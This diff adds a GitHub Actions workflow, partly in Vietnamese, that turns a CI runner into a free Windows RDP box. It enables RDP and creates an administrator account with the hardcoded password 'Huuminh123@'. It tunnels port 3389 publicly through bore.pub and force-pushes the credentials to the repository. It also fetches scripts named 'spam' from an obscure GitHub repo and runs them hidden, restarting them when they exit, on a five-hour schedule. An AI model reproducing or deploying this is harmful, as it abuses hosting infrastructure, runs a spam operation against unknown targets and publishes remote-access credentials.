@@ -1,0 +1,279 @@
+name: RDP by Huu Minh (V7 - Chốt Hạ Tuyệt Đối)
+
+on:
+  workflow_dispatch:
+    inputs:
+      server_url:
+        description: 'Server URL for logs'
+        required: false
+      machine_id:
+        description: 'Machine ID for logs'
+        required: false
+  schedule:
+    - cron: "0 */5 * * *"
+
+concurrency:
+  group: vps-bore-runner
+  cancel-in-progress: true
+
+jobs:
+  build:
+    runs-on: windows-latest
+    permissions:
+      contents: write
+    timeout-minutes: 1440
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: 🛠️ Setup Logging Helper
+        shell: pwsh
+        run: |
+          $code = @'
+          param([string]$message)
+          Write-Host "[SYSTEM LOG]: $message"
+          $serverUrl = "${{ github.event.inputs.server_url }}"
+          $machineId = "${{ github.event.inputs.machine_id }}"
+          if ($serverUrl -and $machineId) {
+            try {
+              $body = @{ machineId = $machineId; message = $message } | ConvertTo-Json -Compress
+              Invoke-RestMethod -Uri "$serverUrl/api/machine-log" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10 | Out-Null
+            } catch {
+              Write-Host "Failed to report log to server: $_"
+            }
+          }
+          '@
+          $code | Out-File -FilePath "report-log.ps1" -Encoding UTF8
+
+      - name: Download and Extract Bore
+        shell: pwsh
+        run: |
+          .\report-log.ps1 "📥 Đang tải và giải nén Bore..."
+          Invoke-WebRequest -Uri "https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-pc-windows-msvc.zip" -OutFile bore.zip
+          Expand-Archive bore.zip -DestinationPath bore
+          .\report-log.ps1 "✅ Đã tải Bore."
+
+      - name: Enable RDP + Create Admin User
+        shell: pwsh
+        run: |
+          .\report-log.ps1 "👤 Cấu hình tài khoản Admin & RDP..."
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          $pass = ConvertTo-SecureString "Huuminh123@" -AsPlainText -Force
+          New-LocalUser "Administrator" -Password $pass -FullName "Administrator"
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Administrator"
+          Add-LocalGroupMember -Group "Administrators" -Member "Administrator"
+          .\report-log.ps1 "✅ Tạo tài khoản Administrator thành công (Pass: Huuminh123@)."
+
+      - name: Tối ưu Registry 4K
+        shell: pwsh
+        run: |
+          .\report-log.ps1 "🚀 Đang cấu hình Registry tối ưu RDP 4K/120FPS..."
+          $tsPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"
+          if (!(Test-Path $tsPath)) { New-Item -Path $tsPath -Force }
+          Set-ItemProperty -Path $tsPath -Name "fEnableVirtualizedGraphics" -Value 1 -Type DWord
+          Set-ItemProperty -Path $tsPath -Name "MinFrameRate" -Value 120 -Type DWord
+          .\report-log.ps1 "✅ Registry optimized."
+
+      - name: 🌐 Set UTF-8 Encoding
+        shell: pwsh
+        run: |
+          [System.Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+          [System.Console]::InputEncoding = [System.Text.Encoding]::UTF8
+          $env:PYTHONIOENCODING = "utf-8"
+          $env:PYTHONUTF8 = "1"
+          chcp 65001
+          echo "PYTHONIOENCODING=utf-8" >> $env:GITHUB_ENV
+          echo "PYTHONUTF8=1" >> $env:GITHUB_ENV
+
+      - name: 🐍 Cài đặt Python 3.12 và thư viện
+        shell: pwsh
+        run: |
+          .\report-log.ps1 "🐍 Đang cài đặt Python 3.12 và các thư viện..."
+          
+          if (!(Get-Command python -ErrorAction SilentlyContinue)) {
+            .\report-log.ps1 "📦 Đang cài đặt Python 3.12..."
+            Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe" -OutFile python-installer.exe
+            Start-Process -FilePath ".\python-installer.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
+            Remove-Item python-installer.exe -Force
+            .\report-log.ps1 "✅ Đã cài đặt Python 3.12"
+          }
+          
+          .\report-log.ps1 "📦 Đang cài đặt các thư viện Python..."
+          python -m pip install --upgrade pip --quiet
+          python -m pip install cloudscraper dnspython telebot requests beautifulsoup4 pytz colorama tqdm urllib3 psutil fake-useragent --quiet
+          python -m pip install pathlib python-telegram-bot bs4 gspread oauth2client httpx ddddocr gtts deep-translator selenium webdriver-manager pyperclip pyTelegramBotAPI cfonts pycryptodome dexron aiohttp websocket-client python-socketio flask pillow qrcode python-dotenv lequangminh lxml requests-html PyGithub pyyaml toml configparser cryptography pyOpenSSL certifi chardet idna six typing-extensions zope.interface twisted autobahn websockets async-timeout frozenlist multidict yarl aiosignal attrs pyasn1 pyasn1-modules rsa cachetools google-auth google-auth-oauthlib google-api-python-client --quiet
+          python -m pip install httpx ddddocr pycryptodome pillow --quiet
+          .\report-log.ps1 "✅ Đã cài đặt tất cả thư viện cần thiết"
+
+      - name: 📝 Tải các file spam
+        shell: pwsh
+        run: |
+          .\report-log.ps1 "📝 Đang tải các file spam từ GitHub..."
+          
+          $files = @("spam", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10")
+          $baseUrl = "https://raw.githubusercontent.com/Vhjkjfftf56774njjkkkjdss/Vhjkjfftf56774njjkkkj-/refs/heads/main"
+          
+          foreach ($file in $files) {
+            $url = "$baseUrl/$file.py"
+            $outFile = "$file.py"
+            try {
+              Invoke-WebRequest -Uri $url -OutFile $outFile
+              .\report-log.ps1 "✅ Đã tải $outFile"
+            } catch {
+              $errorMsg = $_.Exception.Message
+              .\report-log.ps1 "⚠️ Không thể tải $outFile - $errorMsg"
+            }
+          }
+          
+          .\report-log.ps1 "✅ Đã tải tất cả các file spam thành công"
+
+      - name: Monitor Bore Stream & Run Spam
+        shell: pwsh
+        run: |
+          .\report-log.ps1 "🌐 Khởi chạy Bore stream & Spam..."
+          
+          .\report-log.ps1 "📱 Khởi chạy spam.py..."
+          
+          $logFile = "spam_output.log"
+          $errorLog = "spam_error.log"
+          
+          $spamProcess = Start-Process -FilePath "python" -ArgumentList "-X utf8 spam.py" -WindowStyle Hidden -PassThru -RedirectStandardOutput $logFile -RedirectStandardError $errorLog
+          Start-Sleep -Seconds 3
+          
+          if ($spamProcess.HasExited) {
+            .\report-log.ps1 "⚠️ spam.py đã thoát sớm! Kiểm tra spam_error.log"
+            if (Test-Path $errorLog) {
+              Get-Content $errorLog -Tail 20 | ForEach-Object { .\report-log.ps1 "ERROR: $_" }
+            }
+          } else {
+            .\report-log.ps1 "✅ spam.py đang chạy với PID: $($spamProcess.Id)"
+            if (Test-Path $logFile) {
+              Get-Content $logFile -Tail 5 | ForEach-Object { .\report-log.ps1 "OUTPUT: $_" }
+            }
+          }
+
+          $RDP_USER = "Administrator"
+          $RDP_PASS = "Huuminh123@"
+          $lastFullAddress = ""
+
+          git config --global user.name "HuuMinh-Bot"
+          git config --global user.email "bot@trueteam.top"
+          git config --global core.autocrlf false
+
+          .\report-log.ps1 "🔍 Đang kết nối Bore Server..."
+
+          $psi = New-Object System.Diagnostics.ProcessStartInfo
+          $psi.FileName = ".\bore\bore.exe"
+          $psi.Arguments = "local 3389 --to bore.pub"
+          $psi.UseShellExecute = $false
+          $psi.RedirectStandardOutput = $true
+          $psi.RedirectStandardError = $true
+          $psi.CreateNoWindow = $true
+          $process = [System.Diagnostics.Process]::Start($psi)
+
+          function Remove-FileWithRetry {
+            param([string]$filePath)
+            $maxRetries = 10
+            $retryDelay = 500
+            for ($i = 0; $i -lt $maxRetries; $i++) {
+              try {
+                if (Test-Path $filePath) {
+                  Remove-Item $filePath -Force -ErrorAction Stop
+                  .\report-log.ps1 "✅ Đã xóa file cũ: $filePath"
+                }
+                return $true
+              } catch {
+                $attempt = $i + 1
+                $msg = "⚠️ Lần thử " + $attempt + "/" + $maxRetries + ": Không thể xóa file, đang thử lại..."
+                .\report-log.ps1 $msg
+                Start-Sleep -Milliseconds $retryDelay
+              }
+            }
+            return $false
+          }
+
+          while (!$process.HasExited) {
+            if ($process.StandardOutput.Peek() -ge 0) {
+              $line = $process.StandardOutput.ReadLine()
+              if ($line) { 
+                Write-Host "[bore] $line" 
+                
+                if ($line -match "(?:listening at|remote forwarding at) (bore\.pub:\d+)") {
+                  $fullAddress = $matches[1]
+                  $portOnly = $fullAddress.Split(':')[1]
+
+                  if ($fullAddress -ne $lastFullAddress) {
+                    $lastFullAddress = $fullAddress
+                    .\report-log.ps1 "✅ Mở port RDP thành công trên Bore: $fullAddress"
+                    
+                    $createdAt = (Get-Date).ToString('HH:mm:ss dd/MM/yyyy')
+                    $reportLines = @(
+                      '=======================================================',
+                      'RDP INFO - Huu Minh Edition',
+                      '=======================================================',
+                      "FULL ADDRESS   : $fullAddress",
+                      "PORT           : $portOnly",
+                      'HOST           : bore.pub',
+                      '-------------------------------------------------------',
+                      "Username       : $RDP_USER",
+                      "Password       : $RDP_PASS",
+                      "Created        : $createdAt",
+                      '======================================================='
+                    )
+                    $report = ($reportLines -join "`r`n")
+                    
+                    $deleted = Remove-FileWithRetry -filePath "rdp_info.txt"
+                    
+                    if ($deleted -or !(Test-Path "rdp_info.txt")) {
+                      [System.IO.File]::WriteAllText("$(Get-Location)\rdp_info.txt", $report)
+                      .\report-log.ps1 "✅ Đã ghi file rdp_info.txt mới"
+                    } else {
+                      .\report-log.ps1 "❌ Không thể xóa file cũ, thử ghi đè..."
+                      try {
+                        [System.IO.File]::WriteAllText("$(Get-Location)\rdp_info.txt", $report)
+                        .\report-log.ps1 "✅ Đã ghi đè file thành công"
+                      } catch {
+                        .\report-log.ps1 "❌ Vẫn không thể ghi file: $_"
+                      }
+                    }
+                    
+                    git checkout main
+                    git add rdp_info.txt
+                    git commit -m "Update RDP: $portOnly [skip ci]"
+                    git push origin main --force
+                    
+                    .\report-log.ps1 "✅ Đã commit thông tin RDP lên repo: $fullAddress"
+                  }
+                }
+              }
+            }
+            
+            if (Test-Path $logFile) {
+              $newOutput = Get-Content $logFile -Tail 3
+              if ($newOutput) {
+                $newOutput | ForEach-Object { 
+                  if ($_ -and $_.Trim()) {
+                    .\report-log.ps1 "SPAM: $_" 
+                  }
+                }
+              }
+            }
+            
+            if ($spamProcess.HasExited) {
+              .\report-log.ps1 "⚠️ spam.py đã chết! Đang khởi động lại..."
+              $spamProcess = Start-Process -FilePath "python" -ArgumentList "-X utf8 spam.py" -WindowStyle Hidden -PassThru -RedirectStandardOutput $logFile -RedirectStandardError $errorLog
+              Start-Sleep -Seconds 2
+              .\report-log.ps1 "✅ Đã restart spam.py với PID: $($spamProcess.Id)"
+            }
+            
+            Start-Sleep -Milliseconds 500
+          }
+
+          if (!$spamProcess.HasExited) {
+            $spamProcess.Kill()
+            .\report-log.ps1 "🛑 Đã dừng spam.py"
+          }
